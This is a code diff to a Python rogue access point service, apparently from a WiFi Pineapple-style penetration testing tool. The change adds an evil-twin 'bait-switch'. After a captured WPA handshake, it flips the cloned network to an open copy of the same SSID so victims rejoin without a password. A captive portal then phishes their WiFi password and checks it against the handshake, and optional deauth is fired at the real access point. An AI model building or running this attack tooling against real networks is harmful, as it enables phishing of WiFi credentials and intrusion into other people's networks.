@@ -199,8 +199,22 @@ class PineAPService:
             # lifecycle; we just track for the UI status pill)
             "karma_running":     False,
             "sentinel_running":  False,
+            # Whether recon was scanning when we paused it to claim the
+            # monitor radio. Captured at start so teardown only *restores*
+            # recon if it was actually running before — otherwise stopping
+            # the rogue AP would spuriously start a scan the operator never
+            # asked for.
+            "recon_was_running": False,
             # Evil WPA EAPOL sniffer running flag (S12)
             "evil_wpa_running":  False,
+            # Captive-portal phishing bait-switch (S12.5). Per-start
+            # option: when True (and the global captive-portal opt-in is
+            # on in Settings → Security), the first harvested partial
+            # auto-flips the rogue from WPA2 to an Open clone of the same
+            # SSID and arms the captive portal against that handshake.
+            "auto_captive_portal": False,
+            # Runtime flag — True while the portal is live post-flip.
+            "captive_portal_active": False,
             # Optional "evil-twin" deauth coupling (S12): when True AND a
             # real target BSSID is known (i.e. cloned from Recon), Start
             # also fires broadcast deauth at the real AP on the spare
@@ -274,6 +288,7 @@ class PineAPService:
         hw_mode: str | None = None,
         security_mode: str | None = None,
         evil_wpa_deauth: bool | None = None,
+        auto_captive_portal: bool | None = None,
     ) -> tuple[bool, str]:
         """Update the rogue AP config (primary SSID + channel + hidden +
         band + security mode). Refuses while PineAP is running —
@@ -319,11 +334,15 @@ class PineAPService:
                 if security_mode == "open" and self._state.get("security_mode") == "wpa2":
                     self._state["evil_wpa_target"] = None
                     # Switching back to open also disarms the evil-twin
-                    # deauth coupling (it only makes sense for WPA clones).
+                    # deauth coupling + captive-portal bait-switch (both
+                    # only make sense for a WPA clone).
                     self._state["evil_wpa_deauth"] = False
+                    self._state["auto_captive_portal"] = False
                 self._state["security_mode"] = security_mode
             if evil_wpa_deauth is not None:
                 self._state["evil_wpa_deauth"] = bool(evil_wpa_deauth)
+            if auto_captive_portal is not None:
+                self._state["auto_captive_portal"] = bool(auto_captive_portal)
             self._state["last_changed"] = time.time()
             self._save_state()
         return True, "AP config updated"
@@ -590,6 +609,7 @@ class PineAPService:
             self._state["karma_running"]      = False
             self._state["evil_wpa_running"]   = False
             self._state["sentinel_running"]   = False
+            self._state["captive_portal_active"] = False
             self._state["last_changed"]       = time.time()
             self._save_state()
         msgs.append("stopped")
@@ -868,13 +888,22 @@ class PineAPService:
 
         if want_karma or want_evil_wpa:
             # Pause recon to free the monitor radio (same operational
-            # cost for either sub-service)
+            # cost for either sub-service). Remember whether it was
+            # actually running first, so teardown only restores it if so.
             try:
                 from app.services.recon import get_service as get_recon_svc
                 rs = get_recon_svc()
-                if hasattr(rs, "stop_scan"):
+                was_running = False
+                if hasattr(rs, "get_status"):
+                    was_running = (rs.get_status() or {}).get("state") == "running"
+                with self._lock:
+                    self._state["recon_was_running"] = was_running
+                    self._save_state()
+                if was_running and hasattr(rs, "stop_scan"):
                     rs.stop_scan()
-                msgs.append(f"recon paused ({mon_iface} claimed)")
+                    msgs.append(f"recon paused ({mon_iface} claimed)")
+                else:
+                    msgs.append(f"recon was idle — {mon_iface} already free")
             except Exception:
                 log.exception("pineap: recon-pause failed")
                 msgs.append("recon-pause failed (continuing)")
@@ -921,6 +950,7 @@ class PineAPService:
                     deauth_enabled=deauth_on,
                     deauth_iface=deauth_iface if deauth_on else None,
                     deauth_bssid=real_bssid if deauth_on else None,
+                    auto_captive_portal=bool(snap.get("auto_captive_portal")),
                 )
                 with self._lock:
                     self._state["evil_wpa_running"] = ok
@@ -949,6 +979,19 @@ class PineAPService:
             self._load()
             snap = dict(self._state)
 
+        # 0. Captive portal (S12.5) — take the sentinel out of portal
+        #    mode and disarm the verifier so a stale handshake never
+        #    outlives the session. The sentinel itself is stopped below.
+        if snap.get("captive_portal_active"):
+            try:
+                from app.services.captive_sentinel import get_service as get_sentinel
+                get_sentinel().set_portal_mode(False)
+                from app.services.captive_portal import get_service as get_cp
+                get_cp().disarm()
+                msgs.append("captive portal disarmed + sentinel un-lied")
+            except Exception as e:
+                msgs.append(f"captive portal teardown failed: {e}")
+
         # 1. Karma OR Evil WPA (mutually exclusive — both pin wlan-mon-5g).
         #    Evil WPA's stop() also tears down the coupled deauth thread
         #    on the spare radio.
@@ -966,17 +1009,23 @@ class PineAPService:
                 msgs.append(f"evil_wpa stop: {msg}")
             except Exception as e:
                 msgs.append(f"evil_wpa stop failed: {e}")
-        # Restore recon if either sub-service had paused it
-        if snap.get("karma_running") or snap.get("evil_wpa_running"):
+        # Restore recon ONLY if it was running before we paused it. If the
+        # operator had recon stopped before starting the rogue AP, leave it
+        # stopped — restarting it on teardown would be a surprise scan they
+        # never asked for.
+        if (snap.get("karma_running") or snap.get("evil_wpa_running")) \
+                and snap.get("recon_was_running"):
             try:
                 from app.services.recon import get_service as get_recon_svc
                 rs = get_recon_svc()
                 if hasattr(rs, "start_scan"):
                     rs.start_scan()
-                msgs.append("recon restored")
+                msgs.append("recon restored (was running before)")
             except Exception:
                 log.exception("pineap: recon-restore failed")
                 msgs.append("recon-restore failed (manual restart may be needed)")
+        elif snap.get("karma_running") or snap.get("evil_wpa_running"):
+            msgs.append("recon left stopped (was not running before)")
 
         # 2. Captive sentinel + client_recon tailer
         try:
@@ -1030,6 +1079,109 @@ class PineAPService:
             msgs.append(f"{iface} teardown failed: {e}")
 
         return msgs
+
+    # ---------- Captive-portal bait-switch (S12.5) ----------
+    def launch_captive_portal(self, hash_line: str, ssid: str
+                              ) -> tuple[bool, list[str]]:
+        """Bait-switch: after Evil WPA harvests a partial, flip the rogue
+        from WPA2 to an **Open** clone of the same SSID and arm the
+        captive portal against the captured handshake. Called by
+        ``evil_wpa`` on the first partial when the per-start
+        ``auto_captive_portal`` option was set.
+
+        Gated on the global captive-portal opt-in (Settings → Security).
+        Idempotent-ish: re-arming with a fresh handshake is harmless.
+        """
+        msgs: list[str] = []
+        from app.services.captive_portal import get_service as get_cp
+        cp = get_cp()
+        if not cp.is_enabled():
+            return False, ["captive portal disabled (Settings → Security) "
+                           "— bait-switch skipped"]
+        with self._lock:
+            self._load()
+            if not self._state.get("running"):
+                return False, ["pineap not running — bait-switch skipped"]
+            snap = dict(self._state)
+
+        # 1. Arm the verifier against the captured handshake.
+        ok, msg = cp.arm(hash_line, ssid)
+        msgs.append(f"portal arm: {msg}")
+        if not ok:
+            return False, msgs
+
+        # 2. Flip hostapd WPA2 → Open (same SSID/BSSID/channel).
+        ok, sub = self._rerender_hostapd_open(snap)
+        msgs.extend(sub)
+        if not ok:
+            cp.disarm()
+            return False, msgs
+
+        # 3. Put the captive sentinel into portal/lie mode, handing it the
+        #    portal service instance (the handler runs without app context).
+        try:
+            from app.services.captive_sentinel import get_service as get_sentinel
+            get_sentinel().set_portal_mode(True, portal=cp)
+            msgs.append("captive sentinel → portal mode")
+        except Exception as e:
+            msgs.append(f"sentinel portal-mode failed: {e}")
+
+        with self._lock:
+            self._state["captive_portal_active"] = True
+            self._state["last_changed"] = time.time()
+            self._save_state()
+        log.info("pineap: captive-portal bait-switch live for %r", ssid)
+        return True, msgs
+
+    def _rerender_hostapd_open(self, snap: dict[str, Any]
+                               ) -> tuple[bool, list[str]]:
+        """Re-render hostapd as an OPEN AP (same iface/SSID/BSSID/channel)
+        and restart the job, replacing the WPA2 instance. The same-SSID
+        open clone is what lets the victim rejoin password-free so the
+        captive portal can fire."""
+        import signal as _signal
+
+        from app.tools import hostapd as hostapd_tool
+        from app.services.job_manager import job_manager
+        from app.tools._common import stub_mode
+
+        msgs: list[str] = []
+        iface   = snap["iface"]
+        ssid    = snap["primary_ssid"]
+        channel = int(snap["channel"])
+        hw_mode = snap["hw_mode"]
+        salt    = snap["bssid_salt"]
+        bssid   = hostapd_tool.bssid_for_ssid(ssid, salt)
+
+        body = hostapd_tool.render_config(
+            iface=iface, ssid=ssid, password=None,   # None → open AP
+            channel=channel, hw_mode=hw_mode,
+            primary_bssid=bssid, hidden=False, extra_bsses=[],
+        )
+        hostapd_tool.write_config(HOSTAPD_CONFIG_PATH, body)
+
+        # Stop the WPA hostapd job, start the open one.
+        old = snap.get("hostapd_job_id")
+        if old and not stub_mode():
+            try:
+                job_manager.stop_job(old, grace=3.0,
+                                     first_signal=_signal.SIGTERM)
+            except Exception as e:
+                msgs.append(f"stop old hostapd failed: {e}")
+        try:
+            job = job_manager.start_job(
+                ["hostapd", str(HOSTAPD_CONFIG_PATH)],
+                name="pineap-hostapd-open", tags=["pineap"],
+            )
+            with self._lock:
+                self._state["hostapd_job_id"] = job.id
+                self._save_state()
+            msgs.append(f"hostapd flipped to OPEN clone of {ssid!r} "
+                        f"on ch{channel} (job {job.id})")
+        except Exception as e:
+            log.exception("pineap: open-hostapd flip failed")
+            return False, msgs + [f"open hostapd launch failed: {e}"]
+        return True, msgs
 
 
 # ---------- Module singleton ----------
